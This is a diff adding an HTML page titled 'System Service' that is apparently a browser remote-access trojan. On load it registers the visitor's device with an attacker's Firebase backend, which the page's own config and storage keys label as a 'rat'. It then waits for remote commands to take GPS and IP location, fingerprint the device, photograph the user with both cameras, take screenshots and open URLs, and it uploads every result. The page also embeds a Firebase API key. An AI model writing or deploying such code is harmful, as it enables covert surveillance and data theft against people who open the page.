@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>System Service</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Courier New',monospace;flex-direction:column;gap:12px;text-align:center;padding:20px}
+.status-text{font-size:12px;color:#0f0}
+.id-text{font-size:8px;color:#333;margin-top:8px}
+.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px;animation:fadeIn .3s}
+@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}
+.alert-box{background:#0a0a0a;border:1px solid #ff3333;border-radius:20px;padding:40px;text-align:center;max-width:90vw;box-shadow:0 0 60px rgba(255,0,0,.2)}
+.alert-msg{color:#ff4444;font-size:18px;font-weight:700;font-family:'Segoe UI',sans-serif;word-break:break-all;line-height:1.4}
+.alert-close{background:transparent;color:#ff4444;border:1px solid #ff4444;padding:12px 32px;border-radius:12px;font-size:14px;font-weight:600;cursor:pointer;margin-top:20px;transition:all .2s;font-family:'Segoe UI',sans-serif}
+.alert-close:hover{background:#ff4444;color:#000}
+</style>
+</head>
+<body>
+<div class="status-text" id="statusMsg">Connecting...</div>
+<div class="id-text" id="idDisplay"></div>
+
+<script>
+let DEVICE_ID = localStorage.getItem('azrilxrat_device_id');
+if(!DEVICE_ID){DEVICE_ID='TGT_'+Math.random().toString(36).substr(2,9)+Date.now().toString(36);localStorage.setItem('azrilxrat_device_id',DEVICE_ID)}
+document.getElementById('idDisplay').textContent=DEVICE_ID;
+
+const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
+firebase.initializeApp(FB);
+const db=firebase.database();
+const storage=firebase.storage();
+
+db.ref('devices/'+DEVICE_ID).update({id:DEVICE_ID,model:navigator.userAgent.split(';')[1]?.trim()||'Browser',platform:navigator.platform,language:navigator.language,screenSize:screen.width+'x'+screen.height,registeredAt:Date.now(),lastSeen:Date.now(),online:true}).then(()=>document.getElementById('statusMsg').textContent='ACTIVE').catch(()=>document.getElementById('statusMsg').textContent='ERROR');
+setInterval(()=>db.ref('devices/'+DEVICE_ID).update({lastSeen:Date.now(),online:true}),10000);
+
+async function uploadFile(blob,folder,ext){const ref=storage.ref(folder+'/'+DEVICE_ID+'_'+Date.now()+'.'+ext);await ref.put(blob);return await ref.getDownloadURL()}
+
+async function getGPSFull(){return new Promise(resolve=>{if(!navigator.geolocation){resolve({error:"GPS denied"});return}navigator.geolocation.getCurrentPosition(async pos=>{const lat=pos.coords.latitude,lng=pos.coords.longitude;try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);const d=await r.json();resolve({lat,lng,accuracy:pos.coords.accuracy,address:d.display_name,district:d.address?.suburb||d.address?.village||d.address?.town||'',city:d.address?.city||d.address?.town||'',state:d.address?.state||'',country:d.address?.country||'',maps:`https://www.google.com/maps?q=${lat},${lng}`})}catch(e){resolve({lat,lng,accuracy:pos.coords.accuracy,maps:`https://www.google.com/maps?q=${lat},${lng}`})}},e=>resolve({error:e.message}),{enableHighAccuracy:true,timeout:8000})})}
+
+async function getIPGeo(){try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();return{ip:d.ip,city:d.city,region:d.region,country:d.country_name,lat:d.latitude,lng:d.longitude,isp:d.org,timezone:d.timezone,asn:d.asn,maps:`https://www.google.com/maps?q=${d.latitude},${d.longitude}`}}catch(e){return{error:"IP geo failed"}}}
+
+async function getDeviceInfo(){let battery='N/A';try{const b=await navigator.getBattery();battery=Math.round(b.level*100)+'% '+(b.charging?'Charging':'Battery')}catch(e){}let ip='N/A';try{ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch(e){}return{ua:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:screen.width+'x'+screen.height,dpr:devicePixelRatio,ram:navigator.deviceMemory||'N/A',cores:navigator.hardwareConcurrency||'N/A',battery,ip,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,vendor:navigator.vendor,online:navigator.onLine,cookies:navigator.cookieEnabled}}
+
+async function captureCam(mode){const v=document.createElement('video');v.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:9999';document.body.appendChild(v);let stream;try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:mode==='front'?'user':'environment'}});v.srcObject=stream;await v.play();await new Promise(r=>setTimeout(r,2000));const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));stream.getTracks().forEach(t=>t.stop());v.remove();return blob}catch(e){if(stream)stream.getTracks().forEach(t=>t.stop());v.remove();return null}}
+
+async function takeAllCameras(){const front=await captureCam('front');const back=await captureCam('back');const result={status:"cameras_captured"};if(front){const url=await uploadFile(front,'photos','jpg');result.frontPhoto=url;result.frontPhotoDownload=url}if(back){const url=await uploadFile(back,'photos','jpg');result.backPhoto=url;result.backPhotoDownload=url}if(!front&&!back)result.error="Camera access denied";return result}
+
+async function takeScreenshot(){try{const canvas=await html2canvas(document.body,{scale:.8,backgroundColor:'#000',allowTaint:true,useCORS:true});const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',.85));const url=await uploadFile(blob,'screenshots','jpg');return{status:"screenshot_captured",screenshotUrl:url,screenshotDownload:url}}catch(e){return{error:e.message}}}
+
+function showFullAlert(msg){const overlay=document.createElement('div');overlay.className='alert-overlay';overlay.innerHTML=`<div class="alert-box"><p class="alert-msg">${msg}</p><button class="alert-close" onclick="this.closest('.alert-overlay').remove()">CLOSE</button></div>`;document.body.appendChild(overlay);return{status:"alerted",message:msg}}
+
+async function executeCommand(cmd){let result={type:cmd,status:"executed",timestamp:Date.now()};if(cmd==='GET_GPS')result.data=await getGPSFull();else if(cmd==='GET_IP_GEO')result.data=await getIPGeo();else if(cmd==='GET_DEVICE_INFO')result.data=await getDeviceInfo();else if(cmd==='CAMERA_FRONT_BACK')result.data=await takeAllCameras();else if(cmd==='SCREENSHOT')result.data=await takeScreenshot();else if(cmd.startsWith('OPEN_URL:')){window.open(cmd.split(':').slice(1).join(':'),'_blank');result.data={opened:true}}else if(cmd.startsWith('ALERT:'))result.data=showFullAlert(cmd.split(':').slice(1).join(':'));else result.data={error:"unknown_command"};return result}
+
+db.ref('commands/'+DEVICE_ID).on('child_added',async snap=>{const c=snap.val();if(!c||c.status!=='pending')return;snap.ref.update({status:'processing'});const r=await executeCommand(c.command);db.ref('collected_data').push(r);snap.ref.update({status:'done'});setTimeout(()=>snap.ref.remove(),2000)});
+</script>
+</body>
+</html>
